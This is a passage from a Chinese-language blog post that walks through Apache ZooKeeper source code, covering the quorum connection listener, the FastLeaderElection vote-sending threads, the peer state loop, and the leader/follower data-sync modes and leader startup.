class="line">    <span class="keyword">this</span>.recvQueue = <span class="keyword">new</span> ArrayBlockingQueue&lt;Message&gt;(RECV_CAPACITY);</span><br><span class="line">    <span class="keyword">this</span>.queueSendMap = <span class="keyword">new</span> ConcurrentHashMap&lt;Long, ArrayBlockingQueue&lt;ByteBuffer&gt;&gt;();</span><br><span class="line">    <span class="keyword">this</span>.senderWorkerMap = <span class="keyword">new</span> ConcurrentHashMap&lt;Long, SendWorker&gt;();</span><br><span class="line">    <span class="keyword">this</span>.lastMessageSent = <span class="keyword">new</span> ConcurrentHashMap&lt;Long, ByteBuffer&gt;();</span><br><span class="line"></span><br><span class="line">    String cnxToValue = System.getProperty(<span class="string">"zookeeper.cnxTimeout"</span>);</span><br><span class="line">    <span class="keyword">if</span>(cnxToValue != <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">this</span>.cnxTO = Integer.parseInt(cnxToValue);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.self = self;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.mySid = mySid;</span><br><span class="line">    <span class="keyword">this</span>.socketTimeout = socketTimeout;</span><br><span class="line">    <span class="keyword">this</span>.view = view;</span><br><span class="line">    <span class="keyword">this</span>.listenOnAllIPs = listenOnAllIPs;</span><br><span class="line"></span><br><span class="line">    initializeAuth(mySid, authServer, authLearner, quorumCnxnThreadsSize,</span><br><span class="line">            quorumSaslAuthEnabled);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Starts listener thread that waits for connection requests</span></span><br><span class="line">    listener = <span class="keyword">new</span> Listener();</span><br><span class="line">    listener.setName(<span class="string">"QuorumPeerListener"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>监听线程初始化，点击 QuorumCnxManager.Listener，找到对应的 run 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ......</span><br><span class="line">  LOG.info(<span class="string">"My election bind port: "</span> + addr.toString());</span><br><span class="line">  setName(addr.toString());</span><br><span class="line">  <span class="comment">// 绑定服务器地址</span></span><br><span class="line">  ss.bind(addr);</span><br><span class="line">  <span class="comment">// 死循环</span></span><br><span class="line">  <span class="keyword">while</span> (!shutdown) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">// 阻塞，等待处理请求</span></span><br><span class="line">          client = ss.accept();</span><br><span class="line">        ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>选举准备，点击 FastLeaderElection</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">FastLeaderElection</span><span class="params">(QuorumPeer self, QuorumCnxManager manager)</span></span>&#123; <span class="keyword">this</span>.stop = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">this</span>.manager = manager;</span><br><span class="line">    starter(self, manager);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">starter</span><span class="params">(QuorumPeer self, QuorumCnxManager manager)</span> </span>&#123; <span class="keyword">this</span>.self = self;</span><br><span class="line">    proposedLeader = -<span class="number">1</span>;</span><br><span class="line">    proposedZxid = -<span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 初始化队列和信息</span></span><br><span class="line">    sendqueue = <span class="keyword">new</span> LinkedBlockingQueue&lt;ToSend&gt;();</span><br><span class="line">    recvqueue = <span class="keyword">new</span> LinkedBlockingQueue&lt;Notification&gt;(); <span class="keyword">this</span>.messenger = <span class="keyword">new</span> Messenger(manager);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-2-选举执行">4.2 选举执行</h3><p><img src="http://qnypic.shawncoding.top/blog/202402291817158.png" alt></p><p>QuorumPeer.java中执行<code> super.start();</code>就相当于执行 QuorumPeer.java 类中的 run()方法。当 Zookeeper 启动后，首先都是 Looking 状态，通过选举，让其中一台服务器成为 Leader，其他的服务器成为 Follower。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ......</span><br><span class="line">        <span class="keyword">while</span> (running) &#123;</span><br><span class="line">            <span class="keyword">switch</span> (getPeerState()) &#123;</span><br><span class="line">            <span class="keyword">case</span> LOOKING:</span><br><span class="line">                LOG.info(<span class="string">"LOOKING"</span>);</span><br><span class="line">                ......</span><br><span class="line">                <span class="comment">// 进行选举，选举结束，返回最终成为 Leader 胜选的那张选票</span></span><br><span class="line">                 setCurrentVote(makeLEStrategy().lookForLeader());</span><br><span class="line">                ......</span><br><span class="line">            <span class="keyword">case</span> FOLLOWING:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                   LOG.info(<span class="string">"FOLLOWING"</span>);</span><br><span class="line">                    setFollower(makeFollower(logFactory));</span><br><span class="line">                    follower.followLeader();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                   LOG.warn(<span class="string">"Unexpected exception"</span>,e);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                   follower.shutdown();</span><br><span class="line">                   setFollower(<span class="keyword">null</span>);</span><br><span class="line">                   updateServerState();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> LEADING:</span><br><span class="line">                LOG.info(<span class="string">"LEADING"</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    setLeader(makeLeader(logFactory));</span><br><span class="line">                    leader.lead();</span><br><span class="line">                    setLeader(<span class="keyword">null</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    LOG.warn(<span class="string">"Unexpected exception"</span>,e);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (leader != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        leader.shutdown(<span class="string">"Forcing shutdown"</span>);</span><br><span class="line">                        setLeader(<span class="keyword">null</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    updateServerState();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            start_fle = Time.currentElapsedTime();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ctrl+alt+b 点击 lookForLeader()的实现类 FastLeaderElection.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Vote <span class="title">lookForLeader</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 正常启动中，所有其他服务器，都会给我发送一个投票</span></span><br><span class="line">         <span class="comment">// 保存每一个服务器的最新合法有效的投票</span></span><br><span class="line">        HashMap&lt;Long, Vote&gt; recvset = <span class="keyword">new</span> HashMap&lt;Long, Vote&gt;();</span><br><span class="line">        <span class="comment">// 存储合法选举之外的投票结果</span></span><br><span class="line">        HashMap&lt;Long, Vote&gt; outofelection = <span class="keyword">new</span> HashMap&lt;Long, Vote&gt;();</span><br><span class="line">        <span class="comment">// 一次选举的最大等待时间，默认值是 0.2s</span></span><br><span class="line">        <span class="keyword">int</span> notTimeout = finalizeWait;</span><br><span class="line">        <span class="comment">// 每发起一轮选举，logicalclock++</span></span><br><span class="line">        <span class="comment">// 在没有合法的 epoch 数据之前，都使用逻辑时钟代替</span></span><br><span class="line">        <span class="comment">// 选举 leader 的规则：依次比较 epoch（任期） zxid（事务 id） serverid（myid） 谁大谁当选 leader</span></span><br><span class="line">        <span class="keyword">synchronized</span>(<span class="keyword">this</span>)&#123;</span><br><span class="line">            <span class="comment">// 更新逻辑时钟，每进行一次选举，都需要更新逻辑时钟</span></span><br><span class="line">            logicalclock.incrementAndGet();</span><br><span class="line">            <span class="comment">// 更新选票（serverid， zxid, epoch）</span></span><br><span class="line">            updateProposal(getInitId(), getInitLastLoggedZxid(), getPeerEpoch());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        LOG.info(<span class="string">"New election. My id =  "</span> + self.getId() +</span><br><span class="line">                <span class="string">", proposed zxid=0x"</span> + Long.toHexString(proposedZxid));</span><br><span class="line">        <span class="comment">// 广播选票，把自己的选票发给其他服务器</span></span><br><span class="line">        sendNotifications();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Loop in which we exchange notifications until we find a leader</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="comment">// 一轮一轮的选举直到选举成功</span></span><br><span class="line">        <span class="keyword">while</span> ((self.getPeerState() == ServerState.LOOKING) &amp;&amp;</span><br><span class="line">                (!stop))&#123;</span><br><span class="line">     ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点击 sendNotifications，广播选票，把自己的选票发给其他服务器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendNotifications</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 遍历投票参与者，给每台服务器发送选票</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">long</span> sid : self.getCurrentAndNextConfigVoters()) &#123;</span><br><span class="line">        QuorumVerifier qv = self.getQuorumVerifier();</span><br><span class="line">        <span class="comment">// 创建发送选票</span></span><br><span class="line">        ToSend notmsg = <span class="keyword">new</span> ToSend(ToSend.mType.notification,</span><br><span class="line">                proposedLeader,</span><br><span class="line">                proposedZxid,</span><br><span class="line">                logicalclock.get(),</span><br><span class="line">                QuorumPeer.ServerState.LOOKING,</span><br><span class="line">                sid,</span><br><span class="line">                proposedEpoch, qv.toString().getBytes());</span><br><span class="line">        <span class="keyword">if</span>(LOG.isDebugEnabled())&#123;</span><br><span class="line">            LOG.debug(<span class="string">"Sending Notification: "</span> + proposedLeader + <span class="string">" (n.leader), 0x"</span>  +</span><br><span class="line">                  Long.toHexString(proposedZxid) + <span class="string">" (n.zxid), 0x"</span> + Long.toHexString(logicalclock.get())  +</span><br><span class="line">                  <span class="string">" (n.round), "</span> + sid + <span class="string">" (recipient), "</span> + self.getId() +</span><br><span class="line">                  <span class="string">" (myid), 0x"</span> + Long.toHexString(proposedEpoch) + <span class="string">" (n.peerEpoch)"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 把发送选票放入发送队列</span></span><br><span class="line">        sendqueue.offer(notmsg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 FastLeaderElection.java 类中查找 WorkerSender 线程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WorkerSender</span> <span class="keyword">extends</span> <span class="title">ZooKeeperThread</span> </span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (!stop) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 队列阻塞，时刻准备接收要发送的选票</span></span><br><span class="line">                ToSend m = sendqueue.poll(<span class="number">3000</span>, TimeUnit.MILLISECONDS);</span><br><span class="line">                <span class="keyword">if</span>(m == <span class="keyword">null</span>) <span class="keyword">continue</span>;</span><br><span class="line">                <span class="comment">// 处理要发送的选票</span></span><br><span class="line">                process(m);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        LOG.info(<span class="string">"WorkerSender is down"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Called by run() once there is a new message to send.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> m     message to send</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">process</span><span class="params">(ToSend m)</span> </span>&#123;</span><br><span class="line">        ByteBuffer requestBuffer = buildMsg(m.state.ordinal(),</span><br><span class="line">                                            m.leader,</span><br><span class="line">                                            m.zxid,</span><br><span class="line">                                            m.electionEpoch,</span><br><span class="line">                                            m.peerEpoch,</span><br><span class="line">                                            m.configData);</span><br><span class="line">        <span class="comment">// 发送选票</span></span><br><span class="line">        manager.toSend(m.sid, requestBuffer);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">toSend</span><span class="params">(Long sid, ByteBuffer b)</span> </span>&#123; </span><br><span class="line">    <span class="comment">// 判断如果是发给自己的消息，直接进入自己的 RecvQueue</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.mySid == sid) &#123;</span><br><span class="line">         b.position(<span class="number">0</span>);</span><br><span class="line">         addToRecvQueue(<span class="keyword">new</span> Message(b.duplicate(), sid));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="comment">// 如果是发给其他服务器，创建对应的发送队列或者获取已经存在的发送队列</span></span><br><span class="line">          <span class="comment">// ，并把要发送的消息放入该队列</span></span><br><span class="line">         ArrayBlockingQueue&lt;ByteBuffer&gt; bq = <span class="keyword">new</span> ArrayBlockingQueue&lt;ByteBuffer&gt;(SEND_CAPACITY);</span><br><span class="line">         ArrayBlockingQueue&lt;ByteBuffer&gt; oldq = queueSendMap.putIfAbsent(sid, bq);</span><br><span class="line">         <span class="keyword">if</span> (oldq != <span class="keyword">null</span>) &#123;</span><br><span class="line">             addToSendQueue(oldq, b);</span><br><span class="line">         &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             addToSendQueue(bq, b);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="comment">// 将选票发送出去</span></span><br><span class="line">         connectOne(sid);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与要发送的服务器节点建立通信连接，创建并启动发送器线程和接收器线程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//connectOne-&gt;connectOne-&gt;initiateConnection-&gt;startConnection</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">startConnection</span><span class="params">(Socket sock, Long sid)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    DataOutputStream dout = <span class="keyword">null</span>;</span><br><span class="line">    DataInputStream din = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 通过输出流，向服务器发送数据</span></span><br><span class="line">        BufferedOutputStream buf = <span class="keyword">new</span> BufferedOutputStream(sock.getOutputStream());</span><br><span class="line">        dout = <span class="keyword">new</span> DataOutputStream(buf);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Sending id and challenge</span></span><br><span class="line">        <span class="comment">// represents protocol version (in other words - message type)</span></span><br><span class="line">        dout.writeLong(PROTOCOL_VERSION);</span><br><span class="line">        dout.writeLong(self.getId());</span><br><span class="line">        String addr = formatInetAddr(self.getElectionAddress());</span><br><span class="line">        <span class="keyword">byte</span>[] addr_bytes = addr.getBytes();</span><br><span class="line">        dout.writeInt(addr_bytes.length);</span><br><span class="line">        dout.write(addr_bytes);</span><br><span class="line">        dout.flush();</span><br><span class="line">        <span class="comment">// 通过输入流读取对方发送过来的选票</span></span><br><span class="line">        din = <span class="keyword">new</span> DataInputStream(</span><br><span class="line">                <span class="keyword">new</span> BufferedInputStream(sock.getInputStream()));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        LOG.warn(<span class="string">"Ignoring exception reading or writing challenge: "</span>, e);</span><br><span class="line">        closeSocket(sock);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// authenticate learner</span></span><br><span class="line">    QuorumPeer.QuorumServer qps = self.getVotingView().get(sid);</span><br><span class="line">    <span class="keyword">if</span> (qps != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// TODO - investigate why reconfig makes qps null.</span></span><br><span class="line">        authLearner.authenticate(sock, qps.hostname);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果对方的 id 比我的大，我是没有资格给对方发送连接请求的，直接关闭自己的客户端</span></span><br><span class="line">    <span class="keyword">if</span> (sid &gt; self.getId()) &#123;</span><br><span class="line">        LOG.info(<span class="string">"Have smaller server identifier, so dropping the "</span> +</span><br><span class="line">                <span class="string">"connection: ("</span> + sid + <span class="string">", "</span> + self.getId() + <span class="string">")"</span>);</span><br><span class="line">        closeSocket(sock);</span><br><span class="line">        <span class="comment">// Otherwise proceed with the connection</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 初始化，发送器 和 接收器</span></span><br><span class="line">        SendWorker sw = <span class="keyword">new</span> SendWorker(sock, sid);</span><br><span class="line">        RecvWorker rw = <span class="keyword">new</span> RecvWorker(sock, din, sid, sw);</span><br><span class="line">        sw.setRecv(rw);</span><br><span class="line"></span><br><span class="line">        SendWorker vsw = senderWorkerMap.get(sid);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(vsw != <span class="keyword">null</span>)</span><br><span class="line">            vsw.finish();</span><br><span class="line"></span><br><span class="line">        senderWorkerMap.put(sid, sw);</span><br><span class="line">        queueSendMap.putIfAbsent(sid, <span class="keyword">new</span> ArrayBlockingQueue&lt;ByteBuffer&gt;(</span><br><span class="line">                SEND_CAPACITY));</span><br><span class="line">        <span class="comment">// 启动发送器线程和接收器线程</span></span><br><span class="line">        sw.start();</span><br><span class="line">        rw.start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点击 SendWorker，并查找该类下的 run 方法；点击 RecvWorker，并查找该类下的 run 方法(这里不举例了)，在 FastLeaderElection.java 类中查找 WorkerReceiver 线程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     Message response;</span><br><span class="line">     <span class="keyword">while</span> (!stop) &#123;</span><br><span class="line">         <span class="comment">// Sleeps on receive</span></span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 从 RecvQueue 中取出选举投票消息（其他服务器发送过来的）</span></span><br><span class="line">             response = manager.pollRecvQueue(<span class="number">3000</span>, TimeUnit.MILLISECONDS);</span><br><span class="line">             ......</span><br><span class="line">         &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">         ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5、Follower-和-Leader-状态同步源码">5、Follower 和 Leader 状态同步源码</h2><p>当选举结束后，每个节点都需要根据自己的角色更新自己的状态。选举出的 Leader 更新自己状态为Leader，其他节点更新自己状态为 Follower。Leader 更新状态入口：<code>leader.lead()</code>；Follower 更新状态入口：<code>follower.followerLeader()</code> 注意：</p><ul><li>follower 必须要让 leader 知道自己的状态：epoch、zxid、sid 必须要找出谁是leader；发起请求连接 leader；发送自己的信息给leader；leader 接收到信息，必须要返回对应的信息给 follower</li><li>当leader 得知follower 的状态了，就确定需要做何种方式的数据同步DIFF、TRUNC、SNAP</li><li>执行数据同步</li><li>当 leader 接收到超过半数 follower 的 ack 之后，进入正常工作状态，集群启动完成了</li></ul><p>最终总结同步的方式：</p><ul><li>DIFF 咱两一样，不需要做什么</li><li>TRUNC follower 的 zxid 比 leader 的 zxid 大，所以 Follower 要回滚</li><li>COMMIT leader 的zxid 比 follower 的 zxid 大，发送 Proposal 给 foloower 提交执行</li><li>如果 follower 并没有任何数据，直接使用 SNAP 的方式来执行数据同步（直接把数据全部序列到follower）</li></ul><p><img src="http://qnypic.shawncoding.top/blog/202402291817159.png" alt></p><h2 id="6、服务端启动">6、服务端启动</h2><h3 id="6-1-Leader-启动">6.1  Leader 启动</h3><p><img src="http://qnypic.shawncoding.top/blog/202402291817160.png" alt></p><p>ZooKeeperServer全局查找 Leader，然后 ctrl + f 查找 lead()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lead</span><span class="params">()</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line">    ... ...</span><br><span class="line">    <span class="comment">// 启动 zookeeper 服务</span></span><br><span class="line">     startZkServer();</span><br><span class="line">    ... ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">startZkServer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">// 启动 zookeeper 服务</span></span><br><span class="line">    zk.startup();</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//LeaderZooKeeperServer.java-&gt;super.startup();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ZookeeperServer.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">startup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (sessionTracker == <span class="keyword">null</span>) &#123;</span><br><span class="line">        createSessionTracker();</span><br><span class="line">    &#125;</span><br><span class="line">    startSessionTracker();</span><br><span class="line">    <span class="comment">// 接受请求相关处理</span></span><br><span class="line">    setupRequestProcessors();</span><br><span class="line"></span><br><span class="line">    registerJMX();</span><br><span class="line"></span><br><span class="line">    setState(State.RUNNING);</span><br><span class="line">    notifyAll();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span 